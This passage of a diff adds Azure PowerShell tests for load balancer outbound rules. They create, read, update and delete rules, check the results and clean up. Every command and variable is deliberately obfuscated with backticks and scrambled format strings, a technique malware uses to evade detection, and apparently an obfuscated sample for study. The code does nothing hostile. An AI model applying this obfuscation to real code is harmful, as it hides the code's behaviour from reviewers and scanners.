+        ${vlo`AD`B`Al`ANCer} = &("{5}{1}{3}{0}{2}{4}" -f 'l','B','a','a','ncer','New-AzLoad') -ResourceGroupName ${R`Gn`AMe} -Name ${R`NaMe} -OutboundRule ${vO`Ut`BOU`Nd`RULe} -Sku ${lOAD`BALaNCe`RS`KU} -FrontendIPConfiguration @(${f`RON`TEndipCO`N`F`iGuRAtI`oN}, ${FrO`NTe`Nd`i`pConFIgur`AtioNaDd}) -BackendAddressPool @(${ba`CKE`NdA`Ddress`pO`ol}, ${bacK`endADDrEs`s`po`OLaDd}) -Location ${LoC`AT`ION};
+        &("{0}{2}{3}{1}{4}"-f 'A','rt-No','s','se','tNull') ${vLo`A`dBAlAn`ceR};
+        &("{3}{0}{2}{1}"-f'rt','Null','-Not','Asse') ${vLo`AdB`AlaNc`er}."FronTEn`diPCOnFI`gURat`I`oNS";
+        &("{1}{0}{2}{3}" -f'ert-','Ass','Tr','ue') { ${vlOA`D`BALAn`ceR}."F`RO`NTe`NDiPCONFIguR`A`TIONs"."LeN`gTH" -gt 0 };
+        &("{3}{0}{2}{1}"-f'-Not','ull','N','Assert') ${v`Lo`AdbAl`ANcer}."bACkE`NDad`d`Re`sSPoOlS";
+        &("{2}{1}{0}" -f 'e','u','Assert-Tr') { ${vloa`DbaLa`N`CER}."B`A`CkEn`da`dDrEsspOOLS"."l`eN`gth" -gt 0 };
+        &("{1}{2}{3}{0}" -f 'eEqual','Ass','ert','-Ar') ${R`N`AmE} ${Vo`UTb`O`UndRULe}."Na`ME";
+        &("{2}{0}{1}" -f 'ert-AreE','qual','Ass') ${PRo`TOCOL} ${VoUtBO`UndRu`LE}."P`R`OtoCOL";
+
+        
+        ${VO`Ut`BO`Und`RulE} = &("{4}{0}{2}{3}{5}{1}"-f 'a','fig','ncer','Outbou','Get-AzLoadBal','ndRuleCon') -LoadBalancer ${VLoA`D`BALAn`cEr} -Name ${r`N`AmE};
+        &("{1}{4}{0}{2}{3}"-f'o','A','tNul','l','ssert-N') ${vout`B`oUndr`ULE};
+        &("{1}{0}{2}" -f't','Asser','-True') { &("{4}{2}{1}{0}{5}{3}" -f 'dl','m','ck-C','urnType','Che','etRet') ("{9}{7}{8}{3}{6}{1}{5}{0}{4}{2}" -f 'le','dR','ig','oad','Conf','u','BalancerOutboun','t','-AzL','Ge') ${VoUtB`O`UnD`R`ULe} };
+        &("{2}{0}{4}{1}{3}" -f't-A','qu','Asser','al','reE') ${R`Na`me} ${voUt`BOUn`dR`UlE}."NA`Me";
+        &("{2}{1}{3}{4}{0}" -f 'l','-Ar','Assert','eEq','ua') ${pROt`o`coL} ${VO`U`TBounDru`lE}."PR`OtoC`Ol";
+
+        
+        ${List`Ou`TboUnd`RuLE} = &("{6}{4}{3}{2}{5}{0}{1}" -f'o','nfig','t','lancerOu','LoadBa','boundRuleC','Get-Az') -LoadBalancer ${vLOA`DbaLanc`ER};
+        &("{0}{2}{1}{3}" -f 'Assert','tNu','-No','ll') (${l`IstOU`TBoU`N`DrULE} | &("{0}{1}{2}"-f'Wh','ere','-Object') { ${_}."nA`mE" -eq ${Rn`AMe} });
+
+        
+        ${vl`oADBalANc`er} = &("{5}{1}{10}{0}{2}{4}{8}{3}{9}{6}{7}"-f'L','-A','o','c','ad','Set','utboundRuleCo','nfig','Balan','erO','z') -Name ${Rn`A`Me} -LoadBalancer ${V`loa`DBaLANc`ER} -FrontendIPConfiguration ${FrOn`TendIPc`oNF`i`G`UR`AtION} -BackendAddressPool ${BACKE`ND`ADDREss`PO`ol} -Protocol ${P`Ro`TOcol`set};
+        &("{3}{0}{1}{2}" -f't-No','tNu','ll','Asser') ${v`l`oAdbA`lAnCEr};
+        ${v`lOAdBALan`c`eR} = &("{1}{5}{2}{0}{3}{4}"-f 'dBalan','S','a','c','er','et-AzLo') -LoadBalancer ${VloA`D`Ba`LaNc`er};
+        &("{0}{1}{2}"-f'Ass','ert-N','otNull') ${vLO`AD`BAl`AnCer};
+
+        
+        ${V`ou`T`Bou`NDRuLE} = &("{6}{5}{2}{1}{3}{0}{8}{4}{7}" -f'u','t','ncerOu','bo','R','ala','Get-AzLoadB','uleConfig','nd') -LoadBalancer ${Vl`oADbAlan`cER} -Name ${rn`Ame};
+        &("{0}{2}{1}" -f'Ass','ll','ert-NotNu') ${Voutbo`U`NdrULE};
+        &("{1}{2}{0}"-f 'e','Asse','rt-Tru') { &("{3}{2}{1}{4}{0}" -f 'eturnType','Cmd','ck-','Che','letR') ("{4}{2}{1}{5}{6}{7}{0}{8}{10}{9}{3}"-f 'ndRule','dBalancerOut','zLoa','fig','Get-A','b','o','u','C','n','o') ${VOu`T`BO`UndrULe} };
+        &("{1}{3}{2}{0}" -f 'AreEqual','A','sert-','s') ${R`N`AmE} ${VO`UtbO`U`NDrUle}."N`AMe";
+        &("{3}{2}{1}{0}" -f 'al','u','eEq','Assert-Ar') ${PRo`T`OCOlset} ${vO`UT`B`oU`NdRuLE}."PRo`T`OCoL";
+
+        
+        ${L`I`StoUtB`oUnDRULE} = &("{1}{2}{3}{0}{6}{5}{7}{4}{8}" -f'ancerOutb','Get','-AzLoadBa','l','on','undRul','o','eC','fig') -LoadBalancer ${vlo`ADb`ALANcEr};
+        &("{2}{0}{3}{1}"-f 'e','tNull','Ass','rt-No') (${L`Ist`OU`T`BO`UNdRUlE} | &("{1}{3}{0}{2}"-f'Objec','Where','t','-') { ${_}."N`AMe" -eq ${r`N`Ame} });
+
+        
+        ${vLoaDb`AL`AnceR} = &("{4}{3}{6}{7}{1}{5}{2}{0}"-f 'onfig','erOutboundR','eC','dd-','A','ul','A','zLoadBalanc') -Name ${R`NAM`E`ADD} -LoadBalancer ${V`loadBA`LA`N`cEr} -FrontendIPConfiguration ${FRO`NtEndIpcOnFiGur`A`Ti`O`NadD} -BackendAddressPool ${BacK`e`NdaD`DreS`SPooLAdD} -Protocol ${PrO`T`ocoLadD};
+        &("{2}{3}{1}{0}{4}"-f 'otNu','rt-N','Ass','e','ll') ${V`lOaDbaL`A`NC`eR};
+        ${VLOadB`AL`ANC`eR} = &("{3}{2}{1}{0}"-f'r','e','alanc','Set-AzLoadB') -LoadBalancer ${vL`OAd`B`ALAnCer};
+        &("{1}{0}{3}{2}{4}"-f 'rt-','Asse','l','NotNu','l') ${V`loADb`ALaNceR};
+        &("{2}{1}{0}{4}{3}"-f 'rt','sse','A','NotNull','-') ${vL`o`A`db`AlAnceR}."frOn`T`enD`IPcO`NFIGURaTions";
+        &("{0}{2}{3}{1}"-f'A','e','sser','t-Tru') { ${vL`oa`DB`Al`ANCER}."fR`ON`TEnDiPc`OnFI`GuraT`Io`NS"."LenG`Th" -gt 0 };
+        &("{1}{0}{2}"-f 'rt-NotNu','Asse','ll') ${vlo`Adba`LA`NCER}."BackEND`AdD`R`eSsP`oOLs";
+        &("{0}{2}{1}"-f'Asser','-True','t') { ${v`lo`ADBal`ANCeR}."baC`Ke`NDA`DdrEsspO`OLs"."l`eng`Th" -gt 0 };
+
+        
+        ${vO`UTbO`UNdRULE} = &("{1}{5}{3}{0}{4}{2}"-f'ut','G','eConfig','adBalancerO','boundRul','et-AzLo') -LoadBalancer ${vlOADBA`L`AnCeR} -Name ${rN`A`mEa`dD};
+        &("{2}{0}{1}"-f 'rt','-NotNull','Asse') ${vO`Ut`Bou`N`dRULE};
+        &("{1}{0}{2}" -f 's','A','sert-True') { &("{1}{0}{3}{2}" -f 'tRetur','Check-Cmdle','pe','nTy') ("{5}{1}{6}{0}{4}{3}{2}" -f 'bou','AzLoad','fig','dRuleCon','n','Get-','BalancerOut') ${Vo`U`T`BOUNDru`lE} };
+        &("{4}{0}{2}{1}{3}"-f 'r','Eq','t-Are','ual','Asse') ${R`Nam`EadD} ${VOU`TBOUNd`R`Ule}."n`AmE";
+        &("{1}{4}{0}{3}{2}" -f 'eEq','Asse','l','ua','rt-Ar') ${PRot`ocO`L`Add} ${vou`TBo`UNDru`le}."prot`Oc`Ol";
+
+        
+        ${lisTOu`T`BoUN`Dr`UlE} = &("{9}{7}{2}{1}{8}{10}{0}{4}{6}{5}{3}" -f'bou','Bal','ad','ig','ndRul','Conf','e','AzLo','ancer','Get-','Out') -LoadBalancer ${v`LOaDb`A`l`AnceR};
+        &("{2}{0}{1}{3}" -f 'ss','er','A','t-NotNull') (${Li`StoU`TB`OuNdru`LE} | &("{0}{2}{1}"-f'Where','t','-Objec') { ${_}."N`AmE" -eq ${r`N`AmE`ADD} });
+
+        
+        &("{0}{3}{2}{1}" -f'Asser','ntains','owsCo','t-Thr') { &("{6}{3}{2}{5}{1}{0}{4}" -f 'RuleC','tbound','LoadBal','-Az','onfig','ancerOu','Add') -Name ${rnaMe`A`dd} -LoadBalancer ${VLoAD`Ba`lA`Nc`Er} -FrontendIPConfiguration ${fr`O`Nte`N`DIp`cO`N`FIgURA`TionAdD} -BackendAddressPool ${BA`CkeND`ADDreSSp`OoL`A`DD} -Protocol ${prOt`o`cOl`ADd} } ("{0}{3}{1}{4}{2}"-f 'alr',' exi','s','eady','st');
+
+        
+        ${v`Loa`DbalAnCER} = &("{2}{9}{10}{4}{6}{5}{3}{7}{0}{11}{1}{8}"-f'Rule','n','Remove-','rO','alan','e','c','utbound','fig','A','zLoadB','Co') -LoadBalancer ${V`lO`A`dbA`lAncEr} -Name ${rNAM`eAdD};
+        ${vl`oAd`BaLA`NCER} = &("{3}{1}{4}{7}{5}{9}{0}{2}{8}{6}" -f'ound','ve','Rul','Remo','-Az','oadBalancerOu','fig','L','eCon','tb') -LoadBalancer ${vlo`Ad`BA`LaNcEr} -Name ${r`N`AMe};
+        
+        ${VLOA`dbALa`N`CEr} = &("{1}{3}{2}{4}{0}{7}{6}{5}"-f'c','Remove-','adBa','AzLo','lan','fig','uleCon','erOutboundR') -LoadBalancer ${vL`OadBalAn`C`er} -Name ${RN`A`mE};
+        
+        ${VlOaD`Ba`lan`cEr} = &("{5}{2}{1}{0}{3}{4}" -f'Balanc','d','AzLoa','e','r','Set-') -LoadBalancer ${v`L`oADb`AlancEr};
+        &("{3}{0}{2}{1}" -f's','l','sert-NotNul','A') ${VloA`DbalA`NC`eR};
+
+        
+        &("{1}{3}{0}{5}{4}{2}"-f 'rt-','Ass','ontains','e','C','Throws') { &("{0}{4}{2}{5}{3}{6}{1}" -f'G','oundRuleConfig','Lo','rO','et-Az','adBalance','utb') -LoadBalancer ${vL`oA`DBalAN`c`ER} -Name ${RNa`mE} } ("{4}{1}{0}{3}{5}{7}{2}{6}"-f 'a','cont','ing elem','ins no ','Sequence ','mat','ent','ch');
+
+        
+        &("{5}{1}{4}{2}{0}{3}"-f 'hrowsContain','ss','rt-T','s','e','A') { &("{1}{4}{8}{5}{3}{9}{10}{6}{0}{2}{7}" -f 'undRul','Set-Az','eC','ala','Lo','dB','tbo','onfig','a','nce','rOu') -Name ${RN`AMe} -LoadBalancer ${V`lOadB`A`LANcEr} -FrontendIPConfiguration ${f`RONtEN`DIpcOnFi`GUR`ATIoN} -BackendAddressPool ${BA`CKEnD`ADd`ResSpo`OL} -Protocol ${pro`TocO`LS`ET} } ("{0}{1}{2}{4}{3}"-f 'do','es ','not ','st','exi');
+    }
+    finally
+    {
+        
+        &("{0}{4}{2}{1}{3}"-f 'Clean','u','Gro','p','-Resource') ${R`GnAMe};
+    }
+}
+
+
+function T`ES`T-oUTbo`U`NDru`LeCrUd`ALLPar`A`mEt`e`RS
+{
+    
+    ${r`gNa`Me} = &("{2}{0}{3}{4}{5}{1}" -f 'Re','e','Get-','so','urceGro','upNam');
+    ${Rg`lOcat`iOn} = &("{2}{5}{3}{0}{4}{1}" -f 'ovi','tion','G','Pr','derLoca','et-') ("{1}{2}{4}{0}{3}"-f'ce','R','esou','Management','r');
+    ${r`NAME} = &("{1}{2}{3}{0}" -f 'ame','Get-Reso','urc','eN');
+    ${RNa`mE`ADD} = "${rname}Add";
+    ${loCa`T`ion} = &("{5}{1}{0}{3}{2}{4}"-f 'rovid','P','t','erLoca','ion','Get-') ("{4}{5}{6}{3}{1}{0}{2}" -f 'Balancer','ad','s','twork/lo','Micr','osoft.','Ne');
+    
+    ${p`ROToCOL} = "Udp";
+    ${a`LLocaTe`douTBOUNdpo`Rt} = 8;
+    ${ena`BL`E`TcpREseT} = ${F`AL`se};
+    ${IdlETIMe`ouTinM`IN`UteS} = 15;
+    
+    ${prO`T`oCo`lSEt} = "Tcp";
+    ${a`LloCatEDoU`Tb`OU`NdpORTSEt} = 16;
+    ${EnAblet`CpRE`se`TsEt} = ${f`AL`sE};
+    ${IDl`Eti`mEou`TinM`INU`Te`sset} = 20;
+    
+    ${PrOt`ocOLA`dD} = "All";
+    ${alL`oCATe`douTb`OuN`DPo`Rt`A`DD} = 24;
+    ${ENa`BleTcP`RE`S`eTadD} = ${f`ALsE};
+    ${Id`LETIMEoUtiNM`I`Nu`TEs`Add} = 30;
+    
+    ${pu`Bl`iCI`PadD`ReSsnAmE} = ("{4}{1}{0}{3}{2}{5}"-f 'ic','bl','AddressNa','IP','Pu','me');
+    ${Pub`LiC`IpAd`DRE`S`Sna`mEa`dD} = ("{3}{0}{1}{2}"-f 'bli','cIPAddre','ssNameAdd','Pu');
+    ${P`Ub`l`ici`padDr`Es`Sa`lloCA`TiONMe`Thod} = ("{0}{1}" -f 'Stati','c');
+    ${P`UBliC`i`PA`DDrESSsKu} = ("{1}{0}" -f'ard','Stand');
+    ${f`RONt`ENd`ipC`onfiguRa`TiOnnaME} = ("{4}{5}{2}{0}{1}{3}"-f 'fig','uratio','ndIPCon','nName','F','ronte');
+    ${fR`O`NtEnDIPCOn`FIgURaTioN`N`AME`AdD} = ("{1}{0}{4}{5}{3}{7}{6}{2}" -f 'n','Fro','Add','ura','tend','IPConfig','onName','ti');
+    ${backen`dadDReSS`pooL`N`AMe} = ("{2}{3}{1}{0}{4}"-f 'k','c','B','a','endAddressPoolName');
+    ${bA`c`kENDADDre`s`S`poOl`NA`mEaDD} = ("{0}{6}{5}{3}{2}{1}{4}" -f'Bac','ddressPoolN','A','nd','ameAdd','e','k');
+    ${lo`Ad`BAlA`NceR`sKU} = ("{0}{1}{2}"-f'S','tanda','rd');
+
+    try
+    {
+        ${R`E`S`ouRCegRO`UP} = &("{3}{5}{2}{1}{4}{0}"-f'roup','e','-AzResourc','Ne','G','w') -Name ${r`GN`AME} -Location ${RgLOc`A`TI`oN};
+
+        
+        ${pUbl`i`CIpAd`DreSs} = &("{4}{5}{6}{2}{1}{3}{0}" -f'ess','cIPAdd','i','r','Ne','w-AzPu','bl') -ResourceGroupName ${R`Gna`mE} -Location ${Lo`cAtI`oN} -Name ${PuB`LI`cIP`AddReS`SName} -AllocationMethod ${puB`l`I`c`I`paDDRE`SSaLlo`cATi`o`NmETHOD} -Sku ${PuBlicIpA`DdREs`s`sku};
+        ${fro`N`T`EN`DIpCOnfIGur`AT`ion} = &("{6}{0}{3}{2}{7}{1}{5}{4}" -f'-','a','Lo','Az','rontendIpConfig','lancerF','New','adB') -Name ${FRoNtEndip`cOn`FIGu`RATiONN`AmE} -PublicIpAddress ${pUbL`iC`iPa`dD`R`Ess};
+        ${BAcke`NdAd`DRes`SPo`OL} = &("{2}{7}{4}{1}{6}{0}{10}{5}{8}{9}{3}"-f'e','lancerB','New-','onfig','dBa','sPo','ack','AzLoa','o','lC','ndAddres') -Name ${BAcK`eNDaDdRes`S`PoOLNAMe};
+        ${pU`BLI`Ci`padd`ReSSADD} = &("{6}{0}{3}{1}{2}{4}{5}" -f'Pub','ic','IPAddr','l','es','s','New-Az') -ResourceGroupName ${rGn`AME} -Location ${lOCa`T`i`oN} -Name ${p`UBL`icIp`A`dDRESsnA`mEa`DD} -AllocationMethod ${P`UB`liC`Ip`A`D`dRe`S`saLLoCaTiONmET`HoD} -Sku ${PUb`l`Icip`ADDr`e`sssKU};
+        ${f`R`oNTen`DIpc`oN`FiGura`TioNAdD} = &("{2}{0}{3}{7}{5}{4}{6}{1}" -f'A','ig','New-','zLo','ontendIpC','ancerFr','onf','adBal') -Name ${FrOnTEN`DI`pc`oN`FIgUr`A`TioNnAmEAdd} -PublicIpAddress ${P`U`Bl`iCIpa`DdrE`sSadd};
+        ${BACk`EnDaDdre`sS`POo`lAdD} = &("{0}{6}{10}{9}{3}{12}{1}{4}{11}{5}{8}{2}{7}"-f'N','ac','PoolCon','c','k','ndAdd','ew-AzLoad','fig','ress','an','Bal','e','erB') -Name ${bAck`EnDaddReSSpOOL`NA`m`eadd};
+
+        
+        ${vO`UT`BO`Undr`ULe} = &("{3}{7}{6}{10}{2}{5}{4}{1}{0}{8}{9}"-f'u','o','nce','N','Outb','r','-AzLoadBa','ew','ndRuleCo','nfig','la') -Name ${Rn`AmE} -FrontendIPConfiguration ${FROn`T`end`ipcoNFi`Gu`Rat`ioN} -BackendAddressPool ${BACkENdA`ddress`P`ool} -Protocol ${p`RoT`OCOL} -AllocatedOutboundPort ${aL`LOCA`TE`do`UTBOUndPoRT} -IdleTimeoutInMinutes ${I`DLeTIme`outinmIn`UtES};
+        &("{0}{1}{3}{4}{2}" -f 'A','ss','otNull','ert','-N') ${VOUTboun`D`Rule};
+        &("{3}{0}{2}{1}"-f 'sert-Tr','e','u','As') { &("{4}{2}{0}{1}{3}"-f 'letRe','turnTy','eck-Cmd','pe','Ch') ("{9}{2}{0}{4}{10}{3}{6}{1}{7}{8}{5}" -f'-AzLoadBa','oun','ew','rOu','lanc','ig','tb','dR','uleConf','N','e') ${vo`Ut`Bo`UNdrulE} };
+        ${Vl`oa`dBaL`A`NcER} = &("{3}{4}{0}{2}{1}" -f 'LoadBala','cer','n','Ne','w-Az') -ResourceGroupName ${rGNA`Me} -Name ${r`NAME} -OutboundRule ${V`outBOuNd`Ru`LE} -Sku ${l`oADb`A`LAN`cEr`sKu} -FrontendIPConfiguration @(${fRON`TENDI`pco`NFIg`URA`Ti`on}, ${frO`Nt`ENdIpcOn`FiGURa`TIoN`A`Dd}) -BackendAddressPool @(${b`ACKeNDaD`Dre`SsPOoL}, ${bAcKE`NdAd`DreS`spOo`LA`dD}) -Location ${LOcA`T`i`on};
+        &("{0}{2}{1}"-f 'Asser','ll','t-NotNu') ${VloAd`Bal`AN`cEr};
+        &("{4}{3}{0}{1}{2}" -f 'rt-No','tNu','ll','e','Ass') ${vLoAdB`A`lan`cER}."FR`On`TEnd`Ipconf`iGU`R`AtiONs";
+        &("{1}{3}{2}{0}" -f 'e','A','ru','ssert-T') { ${V`l`oaDB`ALaNCER}."F`RontE`NdiP`CoNfIgURaTio`Ns"."L`E`NgTh" -gt 0 };
+        &("{1}{0}{4}{2}{3}" -f 'e','Ass','-No','tNull','rt') ${VloAdB`AlAN`cer}."B`ACke`NDADD`Re`ssPo`OlS";
+        &("{0}{2}{3}{1}"-f'Asse','rue','rt','-T') { ${VLo`A`DbalanCER}."bacKE`N`D`AdD`REs`spoOLs"."le`NgtH" -gt 0 };
+        &("{2}{3}{1}{0}{4}" -f 're','-A','A','ssert','Equal') ${R`NaMe} ${vO`Utbo`UNd`RuLe}."Na`Me";
+        &("{2}{4}{0}{3}{1}"-f 'eE','ual','Assert-','q','Ar') ${P`R`otoc`Ol} ${v`ouT`BOUN`dR`Ule}."P`ROtO`col";
+        &("{3}{0}{1}{2}" -f 'ssert-A','reE','qual','A') ${A`LLOcaTedO`Ut`BOund`P`ort} ${VOuT`BoUN`dR`UlE}."ALlOca`TeD`OU`TBoun`dp`oRTS";
+        &("{0}{1}{2}" -f 'Asse','rt-AreEq','ual') ${EnABl`e`TCPrES`ET} ${v`OUTbOund`RU`LE}."e`N`AB`LETCPReseT";
+        &("{1}{2}{0}"-f 'Equal','A','ssert-Are') ${iD`lEti`meouTIN`mI`N`UtES} ${vO`UtB`oUNDrU`LE}."IDleT`Imeou`T`iNmINut`Es";
+
+        
+        ${v`OUTBO`UN`drU`lE} = &("{4}{0}{1}{2}{3}{6}{5}" -f 'LoadB','alance','rOutbo','undRu','Get-Az','ig','leConf') -LoadBalancer ${vLoAdBA`lAn`c`er} -Name ${Rn`A`mE};
+        &("{0}{2}{3}{4}{1}" -f'A','Null','s','se','rt-Not') ${voutBou`Ndr`U`Le};
+        &("{0}{1}{2}"-f 'Asser','t-Tr','ue') { &("{0}{3}{2}{4}{1}"-f 'Ch','Type','dletRetu','eck-Cm','rn') ("{5}{0}{3}{9}{4}{1}{8}{7}{6}{2}" -f '-AzLoa','O','g','dB','cer','Get','leConfi','dRu','utboun','alan') ${voUTbo`Un`D`R`UlE} };
+        &("{2}{1}{3}{0}" -f'Equal','ss','A','ert-Are') ${R`NA`mE} ${v`out`BoUn`DrU`Le}."n`Ame";
+        &("{3}{1}{0}{4}{2}"-f 'Eq','rt-Are','al','Asse','u') ${PR`oToC`oL} ${V`OuT`BOUnd`RuLe}."prOt`oc`OL";
+        &("{4}{0}{2}{3}{1}"-f'-Ar','al','eEq','u','Assert') ${A`LlOC`A`Te`DouTbouN`dPo`RT} ${vO`Ut`BoU`NDruLe}."Al`l`o`cAtED`OuTbOUNd`por`TS";
+        &("{1}{0}{2}"-f 'rt-Ar','Asse','eEqual') ${e`N`AbLeTcPREseT} ${v`ouT`BOuNdr`U`LE}."enABleTCpr`e`SET";
+        &("{0}{1}{2}{3}{4}" -f 'A','sse','r','t-AreEqua','l') ${iDLeTI`meouTINM`I`NUteS} ${vOuTbou`N`DR`U`le}."Idl`etImEouTINm`i`N`Ut`ES";
+
+        
+        ${lIsTou`TbOu`NdR`UlE} = &("{4}{2}{9}{1}{5}{8}{6}{3}{0}{7}" -f'nf','ala','Loa','RuleCo','Get-Az','ncerOutbou','d','ig','n','dB') -LoadBalancer ${Vload`BalA`NCEr};
+        &("{2}{3}{4}{0}{1}"-f'r','t-NotNull','As','s','e') (${L`iSToutbOU`N`drULe} | &("{0}{1}{3}{2}" -f'Wh','ere-O','ject','b') { ${_}."n`Ame" -eq ${rn`A`ME} });
+
+        
+        ${V`lo`A`Dba`LANcER} = &("{3}{7}{8}{5}{0}{4}{6}{1}{2}" -f 'bo','ul','eConfig','Set-AzLoad','un','ut','dR','Balancer','O') -Name ${rNA`Me} -LoadBalancer ${Vl`Oa`dbAL`ANCER} -FrontendIPConfiguration ${frO`NT`ENDipcONf`IgU`RatI`on} -BackendAddressPool ${BaC`K`eNd`AdDre`SSPoOL} -Protocol ${Pr`OT`oCOlSEt} -AllocatedOutboundPort ${ALl`oc`Ate`dOu`TboU`NdpoR`TS`ET} -IdleTimeoutInMinutes ${iDLetI`M`eOuT`In`minUtEs`S`Et};
+        &("{2}{0}{1}{3}" -f'ssert-N','ot','A','Null') ${v`L`oa`d`BALancER};
+        ${V`l`OaD`BAL`AnceR} = &("{1}{3}{4}{0}{2}"-f'a','Se','dBalancer','t-','AzLo') -LoadBalancer ${v`L`Oad`BAlAncer};
+        &("{1}{2}{0}"-f 'l','Assert','-NotNul') ${vLOAdb`Al`An`CER};
+
+        
+        ${vOu`TBou`N`dRUle} = &("{2}{4}{1}{7}{6}{5}{3}{8}{0}" -f'nfig','Az','Get','tboundRu','-','BalancerOu','d','Loa','leCo') -LoadBalancer ${VloAdBALa`NC`Er} -Name ${rNA`Me};
+        &("{0}{1}{4}{2}{3}"-f'Assert','-','u','ll','NotN') ${V`Ou`T`BoUNDrU`le};
+        &("{2}{1}{0}" -f'ue','t-Tr','Asser') { &("{1}{0}{3}{2}{4}"-f 'k-Cm','Chec','R','dlet','eturnType') ("{0}{7}{3}{6}{8}{2}{1}{5}{4}"-f 'Get','uleC','ndR','dBalance','nfig','o','rO','-AzLoa','utbou') ${VOu`T`BOuN`DR`ULe} };
+        &("{0}{1}{2}{4}{3}"-f'A','ssert-','AreEqu','l','a') ${R`N`AME} ${VOU`TBoUn`DR`ULE}."na`me";
+        &("{1}{2}{3}{0}"-f 'ual','Assert-A','r','eEq') ${P`RoTo`c`OLSET} ${VOUtb`OUndr`Ule}."p`Rot`OCOL";
+        &("{2}{0}{3}{1}"-f't-AreE','al','Asser','qu') ${ALLOcAT`ED`OUtb`Oun`d`Port`SEt} ${v`oUTboU`N`DrULE}."A`L`LoCA`TedOUTB`oU`NDp`oRTS";
+        &("{1}{3}{0}{4}{2}" -f'AreE','Asser','ual','t-','q') ${EnablEtc`PReseT`s`et} ${vo`U`T`B`ouNdRule}."En`ABlET`cP`REset";
+        &("{3}{0}{1}{2}" -f'sert-Ar','eEq','ual','As') ${iDLetiMEOuti`Nm`INuTes`S`ET} ${Vou`Tbo`Un`d`RuLE}."I`d`LE`TImeO`UtINM`inUTeS";
+
+        
+        ${lisTOUTb`oUn`d`Rule} = &("{5}{6}{3}{8}{7}{4}{2}{1}{0}" -f'ig','nf','eCo','bo','l','Get-AzLoadBala','ncerOut','u','undR') -LoadBalancer ${vlOA`d`BaLAnC`er};
+        &("{2}{1}{4}{3}{0}" -f'l','s','A','tNul','sert-No') (${LI`ST`ouTbouND`R`Ule} | &("{1}{0}{3}{2}"-f'-Ob','Where','ect','j') { ${_}."Na`mE" -eq ${RN`AMe} });
+
+        
+        ${vLoaD`Ba`L`AnceR} = &("{1}{0}{2}{4}{3}{5}{6}"-f'd-AzLoa','Ad','dBalancer','tboundRu','Ou','le','Config') -Name ${rNa`ME`ADD} -LoadBalancer ${VLOADB`A`Lanc`eR} -FrontendIPConfiguration ${f`R`O`Nt`EnDIpcOnfIGuRa`T`ionADd} -BackendAddressPool ${b`ACK`eNDAddRESsp`oOl`ADd} -Protocol ${p`Ro`T`OcolADD} -AllocatedOutboundPort ${aLL`O`c`ATEd`O`UTBoUNdp`O`RtaDd} -IdleTimeoutInMinutes ${idLEtImEOu`TiNmIn`U`TEs`Add};
+        &("{0}{2}{1}{3}" -f'Asse','N','rt-','otNull') ${VLOA`db`AL`AN`cer};
+        ${v`l`OA`DbaLaN`CeR} = &("{1}{3}{0}{2}"-f'la','Set','ncer','-AzLoadBa') -LoadBalancer ${V`lOA`DbALAN`c`eR};
+        &("{0}{2}{1}"-f 'Asse','t-NotNull','r') ${vLO`ADba`l`A`NceR};
+        &("{1}{0}{3}{2}" -f 'sert-N','As','tNull','o') ${vLoAdb`ALaN`c`er}."FR`on`Te`NdiPcOn`FIguraTioNs";
+        &("{2}{0}{1}" -f'e','rt-True','Ass') { ${v`Loa`d`BaL`AnCEr}."fROnTeNDI`Pc`OnfI`guRA`TI`o`Ns"."l`EngtH" -gt 0 };
+        &("{3}{1}{2}{0}{4}" -f 'tNu','er','t-No','Ass','ll') ${Vl`O`AdBAlan`C`er}."BAc`kE`N`dad`Dr`eSspooLS";
+        &("{2}{1}{0}" -f'rt-True','e','Ass') { ${vlo`A`db`ALanCeR}."B`ACkEnDA`Dd`REsSPoo`Ls"."lEn`GtH" -gt 0 };
+
+        
+        ${voutBo`U`ND`RUle} = &("{6}{9}{3}{4}{0}{8}{1}{10}{2}{5}{7}" -f 'O','undRul','on','adBala','ncer','f','Get','ig','utbo','-AzLo','eC') -LoadBalancer ${V`L`oADBALanceR} -Name ${rNaMe`A`DD};
+        &("{0}{2}{1}"-f 'Assert-Not','ull','N') ${V`Ou`Tb`O`UNdrulE};
+        &("{1}{2}{0}" -f'e','As','sert-Tru') { &("{1}{0}{6}{3}{4}{5}{2}" -f'h','C','nType','ck-CmdletR','et','ur','e') ("{6}{4}{9}{1}{5}{0}{8}{7}{3}{2}"-f'Out','an','g','onfi','et-AzLo','cer','G','eC','boundRul','adBal') ${Vo`U`TBoUnDR`ULE} };
+        &("{3}{0}{1}{2}"-f 'rt','-Are','Equal','Asse') ${R`NaM`EAdD} ${vo`UTb`oU`Nd`RULe}."N`Ame";
+        &("{1}{2}{0}{3}"-f 't-AreEqu','A','sser','al') ${PRotoCoL`A`dd} ${Vo`UtbOuNDR`U`lE}."P`RO`TOcOL";
+        &("{1}{2}{0}{4}{3}" -f '-Ar','A','ssert','Equal','e') ${aL`lOc`A`TeDOU`TB`oU`NDpOrtADD} ${VO`U`TBOuN`d`RULE}."a`lLoCAt`E`DoUtbO`UND`PO`Rts";
+        &("{1}{2}{0}"-f'reEqual','Assert','-A') ${E`NaB`LeTC`p`Res`eTaDd} ${V`OUTB`oUnd`RuLE}."ena`BL`ETCpRESet";
+        &("{0}{4}{2}{3}{1}" -f 'As','al','t-Are','Equ','ser') ${IdletIm`EOu`TinmI`NUtes`Add} ${voUTboU`ND`R`ULE}."ID`letiME`oUT`INmiNU`TES";
+
+        
+        ${LISTo`UTBo`UNdrU`lE} = &("{5}{0}{1}{2}{3}{4}{6}"-f 'AzLoad','Ba','l','ancer','OutboundRuleCo','Get-','nfig') -LoadBalancer ${V`lOAd`BA`LanCER};
+        &("{1}{0}{2}"-f 'ert-No','Ass','tNull') (${li`SToutbou`Ndru`lE} | &("{2}{0}{1}{3}" -f'he','r','W','e-Object') { ${_}."NA`me" -eq ${rnaM`EA`Dd} });
+
+        
+        &("{4}{2}{0}{1}{3}" -f 'rt-ThrowsC','on','sse','tains','A') { &("{7}{3}{4}{0}{6}{2}{1}{5}{8}"-f'alancerOu','eConf','undRul','dd-AzL','oadB','i','tbo','A','g') -Name ${RNa`Me`Add} -LoadBalancer ${v`LOAd`B`Al`AnCeR} -FrontendIPConfiguration ${fR`o`NtendipCONF`I`guRAt`IONaDD} -BackendAddressPool ${b`AcKEn`da`d`DR`eSsP`oOLAdD} -Protocol ${pROtoC`oLA`DD} -AllocatedOutboundPort ${a`LLo`C`ATedo`Utbo`UN`dpOR`TADd} -IdleTimeoutInMinutes ${iDleTImE`ouTINMi`NUTes`A`dd} } ("{3}{1}{0}{2}" -f 's','ady exi','ts','alre');
+
+        
